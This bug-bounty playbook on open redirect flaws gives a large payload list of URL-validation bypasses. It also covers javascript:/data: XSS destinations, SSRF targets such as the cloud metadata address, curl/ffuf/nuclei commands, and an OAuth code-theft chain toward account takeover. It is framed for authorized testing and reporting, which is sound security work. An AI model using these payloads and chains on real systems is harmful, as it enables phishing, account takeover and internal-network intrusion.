# Open Redirect

> One-line summary: A parameter the app uses to send users somewhere without validating the destination — pays little alone, pays a lot when chained into OAuth code/token theft, SSRF, or a CSP/allowlist bypass.

## Overview

An open redirect is any endpoint that takes a user-supplied URL (or path) and issues a `Location:` redirect, a meta refresh, or a JS `location` assignment to it without restricting the destination to trusted hosts. The flaw arises when validation is missing entirely or implemented as a naive substring/prefix/regex check that URL parsers disagree with. Standalone impact is phishing credibility (a trusted domain bouncing to a clone), which most programs rate low or explicitly exclude. The real money is in chaining: OAuth `redirect_uri` validation bypass to steal codes/tokens, server-side fetchers following the redirect into internal networks (SSRF), `javascript:`/`data:` destinations producing XSS, and redirects that satisfy a trusted-origin check needed by another flow.

## Where to find it

- Parameters: `url`, `redirect`, `redirect_uri`, `redirect_url`, `return`, `returnUrl`, `returnTo`, `return_to`, `next`, `dest`, `destination`, `continue`, `goto`, `target`, `link`, `out`, `view`, `login_url`, `callback`, `callbackUrl`, `forward`, `r`, `u`, `to`, `image_url`, `file`, `path`, `checkout_url`, `success_url`, `cancel_url`, `post_logout_redirect_uri`, `wreply`, `RelayState`, `state`.
- Flows: login/SSO "return to where you came from", logout, password-reset "back to app", email verification, magic links, payment success/cancel URLs (Stripe/Checkout), OAuth authorize endpoints, SAML `RelayState`, app deep links, unsubscribe pages, 404 "did you mean" handlers.
- Delivery: `Location` header (302/303/307), `<meta http-equiv="refresh">`, JS `location.href = param` / `window.location.assign`, form `action` set from a param, SPA routers reading `?next=` in a route guard.
- Every input that looks like a URL is also a server-side fetch candidate — the same param that redirects a browser may be fetched by the backend (test both directions: browser redirect and SSRF).

## Methodology

1. **Collect candidates.** Crawl plus history: `gau target.com | grep -Ei '(redirect|next|return|dest|continue|goto|out=|url=)' | sort -u`. Also read JS bundles for `location.href`/`location.replace` receiving a query param — client-side redirects never show in a `curl -I`.
2. **Baseline test.** Replace the value with a domain you control (never a random domain you don't own) with a unique path: `?next=https://YOUR-DOMAIN.oast.pro/r1`. Inspect with `curl -sI` for the `Location` header; for client-side flows, load in a browser and watch the address bar.
3. **Walk the bypass list** (Payloads) when the baseline is blocked. Change one variable at a time and record which payload the validator accepts: protocol-relative `//`, backslash `\`, userinfo `@`, suffix/prefix tricks, encoding, whitespace. The accepted payload tells you what the check is — finish with the minimal bypass, not a shotgun.
4. **Confirm in a real browser and with curl.** `curl -s -o /dev/null -w '%{redirect_url}\n' "URL"` shows the immediate destination; browsers may follow chains and normalize differently. Client-side redirects (SPA deep links, fragment-based) only reproduce in a browser — a curl-only test produces false negatives.
5. **Classify and check special destinations.** Server 302 vs meta refresh vs JS vs form action. Then test `javascript:alert(document.domain)` and `data:text/html,<script>alert(document.domain)</script>` — some sinks accept them and turn this into XSS. Also test redirect to `http://169.254.169.254/` or `http://localhost:8080` if the backend fetches the URL (SSRF lane).
6. **Prove max impact, then report.** Test the OAuth and SSRF chains (below) before writing the report — "open redirect, no chain" is a low on most programs and an instant N/A on some.

## Payloads

```text
# Baseline
https://YOUR-DOMAIN.oast.pro/r1

# Protocol-relative and slash tricks (bypass "must be relative / must start with /" checks)
//YOUR-DOMAIN.oast.pro/r1
///YOUR-DOMAIN.oast.pro/r1
////YOUR-DOMAIN.oast.pro/r1
/\YOUR-DOMAIN.oast.pro/r1
\/YOUR-DOMAIN.oast.pro/r1
\\YOUR-DOMAIN.oast.pro/r1

# Malformed / scheme tricks
https:YOUR-DOMAIN.oast.pro
https:/YOUR-DOMAIN.oast.pro
https:///YOUR-DOMAIN.oast.pro
Https://YOUR-DOMAIN.oast.pro
%2F%2FYOUR-DOMAIN.oast.pro
%5C%5CYOUR-DOMAIN.oast.pro

# Userinfo (@) — everything before @ is userinfo, the browser connects to what follows
https://target.com@YOUR-DOMAIN.oast.pro
https://target.com:443@YOUR-DOMAIN.oast.pro

# Backslash parser differential: browsers (WHATWG) treat \ as / and go to evil host,
# while Python urllib.parse / many server-side validators read the hostname as target.com
https://YOUR-DOMAIN.oast.pro\@target.com
https://YOUR-DOMAIN.oast.pro\.target.com

# Allowlist regex bypasses (naive `target\.com` substring, or startsWith/endsWith checks)
https://target.com.YOUR-DOMAIN.oast.pro
https://target.com-YOUR-DOMAIN.oast.pro
https://YOUR-DOMAIN.oast.pro/?target.com
https://YOUR-DOMAIN.oast.pro#target.com
https://YOUR-DOMAIN.oast.pro&target.com
https://YOUR-DOMAIN.oast.pro/target.com
https://target.com%00.YOUR-DOMAIN.oast.pro

# Whitespace / control characters
https://YOUR-DOMAIN.oast.pro%09
%09//YOUR-DOMAIN.oast.pro
%0d%0a//YOUR-DOMAIN.oast.pro

# Destination classes that upgrade the bug
javascript:alert(document.domain)
javascript:alert(document.domain)//https://target.com
data:text/html,<script>alert(document.domain)</script>
//target.com@YOUR-DOMAIN.oast.pro

# IP and numeric forms — for the SSRF lane (validators that block "internal" hostnames but not encodings)
http://2130706433/                          # 127.0.0.1 as decimal
http://0x7f000001/                          # hex
http://0177.0.0.1/                          # octal
http://127.1/                               # shortened loopback
http://[::1]/                               # IPv6 loopback
http://169.254.169.254/latest/meta-data/    # cloud metadata service

# Client-side sink shapes to look for (the payload is the fragment or param value)
<meta http-equiv="refresh" content="0;url=//YOUR-DOMAIN.oast.pro/r1">
<script>location.href = new URLSearchParams(location.search).get('next')</script>
<script>location.replace(decodeURIComponent(location.hash.slice(1)))</script>

# Chain shape for OAuth (open redirect on a trusted host as the second hop)
https://accounts.target.com/oauth/authorize?client_id=APP&redirect_uri=https%3A%2F%2Ftarget.com%2Fauth%2Fcallback%3Fnext%3Dhttps%3A%2F%2FYOUR-DOMAIN.oast.pro&response_type=code
```

```bash
# Inspect the redirect without following it
curl -sI "https://target.com/login?next=//YOUR-DOMAIN.oast.pro" | grep -i '^location:'

# See where curl actually lands (works for client-side redirects too via --location + final URL)
curl -s -o /dev/null -w '%{url_effective}\n' -L "https://target.com/login?next=https://YOUR-DOMAIN.oast.pro"

# Fuzz one param with the bypass list
ffuf -u "https://target.com/login?next=FUZZ" -w redirects.txt -mr 'YOUR-DOMAIN' -ac

# Loop the payload list and log status code + destination for each attempt
while read -r p; do
  printf '%s -> %s\n' "$p" "$(curl -s -o /dev/null -w '%{http_code} %{redirect_url}' "https://target.com/login?next=$p")"
done < redirects.txt
```

## Bypasses & edge cases

- **Validator allows only the first hop:** chains of two redirects on the same site defeat "first redirect must be same-origin" logic — find a second redirector and nest.
- **Validation reads one param, the sink reads another:** parameter pollution (`?next=safe&next=evil` — server takes first, client takes last) or case variations (`Next=`, `NEXT=`).
- **Whitelist of domains with wildcards:** if `*.target.com` is trusted, any takeoverable subdomain becomes a redirect primitive — pair with the subdomain-takeover playbook.
- **Fragment inheritance:** per the HTTP spec, a 3xx response without a fragment inherits the original fragment — token-in-fragment OAuth implicit flows (`#access_token=...`) survive the redirect chain. Test with the real provider flow, not curl alone.
- **Query forwarding matters for code flow:** the `code` is in the query string; it only reaches you if the redirector forwards extra query params (test: does `?next=https://you/?x=1` produce `?x=1&code=...` or drop it?), or if you use a destination-embedded form like `https://you/?` letting the app append `code=` after your `?`.
- **`redirect_uri` prefix/`startsWith` checks on the OAuth server itself** often accept `https://target.com.YOUR-DOMAIN.oast.pro` or `https://target.com@YOUR-DOMAIN.oast.pro` — no separate open redirect needed; the code lands directly in your callback.
- **Meta refresh / JS sinks:** server-side validation is absent in client-side routers reading `#/redirect?to=`; also some apps validate on the server but the client re-reads the raw param.
- **CRLF in the value** (`%0d%0a`) — usually dead in modern frameworks, still worth one shot when the value is reflected into the `Location` header.
- **Whitelisted-but-dead hosts:** if the check allows `docs.target.com` and that host is dangling, combine with subdomain takeover to own the redirect target.
- **Path-segment redirectors:** `https://target.com/redirect/https://YOUR-DOMAIN.oast.pro` — no parameter at all, the destination sits in the path; parameter-driven scanning misses these entirely.
- **GET vs POST asymmetry:** endpoints that validate `next` on GET but accept the same value unfiltered in the POST body (login form, API) — send both methods with the same payload.
- **Param spelling confusion:** `Next`/`NEXT`/`nExT`, `url[]=`, `url[0]=`, and duplicate params, in case the validator and the sink read different spellings or indices.
- **Open redirect in a third-party** (payment provider, IdP) that the target trusts — often out of scope for them but chainable inside the target's flow; document the full chain in one report on the target program.

## Tools

- **gau / waybackurls** — history mining for redirect-ish params: `gau target.com | grep -Ei '(redirect|next|return|dest|continue|goto)=' | sort -u > params.txt`
- **qsreplace + httpx** — batch test a param across many URLs: `cat params.txt | qsreplace '//YOUR-DOMAIN.oast.pro/r' | httpx-toolkit -silent -mc 301,302,303,307,308 -location -o hits.txt`
- **ffuf** — fuzz one endpoint with the bypass list: `ffuf -u "https://target.com/login?next=FUZZ" -w redirects.txt -mr 'YOUR-DOMAIN' -ac`
- **curl** — precise header control and chain inspection (commands above), plus `-L` to observe the full chain with `-w '%{url_effective}'`.
- **nuclei** — DAST redirect templates: `nuclei -u https://target.com -dast -t dast/vulnerabilities/redirect/` and tag scan: `nuclei -l urls.txt -tags redirect`
- **Burp Suite** — Param Miner to discover hidden redirect params, Repeater for manual chains, and the scanner's open-redirection check as a starting list. Intruder with the bypass list for one-param fuzzing.
- **interactsh-client** — OAST listener to prove server-side fetches follow the redirect (SSRF lane): `interactsh-client -v`

## Escalation & chaining

- **OAuth code/token theft (the classic P1):** open redirect on any host trusted by the `redirect_uri` allowlist → send the victim a genuine authorize link whose `redirect_uri` bounces through it → the code or fragment token lands on your server → exchange it → full ATO. Works because providers validate the first host only.
- **SSRF:** if the same param is fetched server-side (URL import, webhook test, PDF renderer, link preview), redirect it to `http://169.254.169.254/latest/meta-data/` or `http://127.0.0.1:<port>` — the redirect defeats "fetch only from allowlisted hosts" checks.
- **XSS:** `javascript:`/`data:` destinations accepted → script execution on the target origin (especially if the value lands in `location.href`).
- **CSP bypass:** when `script-src` allows a host you can influence via its redirect, the redirect helps load attacker JS through a trusted origin.
- **Login CSRF and logout CSRF** shaping: redirect-after-login params frequently combine with other flows — a redirect to `/attacker-controlled-state` can land the victim in a state you control (e.g., post-OAuth account linking).
- **Phishing with a real domain:** `https://target.com/login?next=https://target.com.secure-login.you/` — the URL bar shows target.com first; report as standalone only if the program pays for it, otherwise keep it as a chain component.

## Report notes

- Exact request and response, with the `Location` header (or the JS/meta snippet) visible, and the final destination URL — use a domain you own with a unique path per test for the bounce log.
- Screenshot/video of the browser address bar ending on your domain, since "browser behavior" is the actual vulnerability; include the curl output for the server-side proof.
- The minimal accepted bypass, not the entire list you tried — triage reproduces one payload and confirms.
- State pre-auth vs post-auth: a redirect usable on the login page (unauthenticated) is materially higher impact.
- Results of the chain tests (OAuth / SSRF / `javascript:`) even if negative — it shows scope of impact and helps severity assignment.
- Note whether the endpoint forwards query strings and fragments (this is what decides OAuth exploitability), and name the trust relationship you are breaking (which allowlist, which flow).

## References

- [PortSwigger KB — Open redirection (reflected)](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PortSwigger Web Security Academy — DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection)
- [PortSwigger — URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
- [OWASP — Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [HackTricks — Open Redirect](https://book.hacktricks.xyz/pentesting-web/open-redirect)
- [PayloadsAllTheThings — Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
- [cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
- [armourinfosec — Lab: Open Redirect to OAuth theft](https://github.com/armourinfosec/Offensive-Web-Application-Security/blob/main/Practical-Labs/Lab-Open-Redirect-to-OAuth-Theft.md)
- [Ethiack — Grafana CVE-2025-6023 bypass: redirect + fragment abuse to ATO](https://ethiack.com/info-hub/research/grafana-cve-2025-6023-bypass-a-technical-deep-dive)
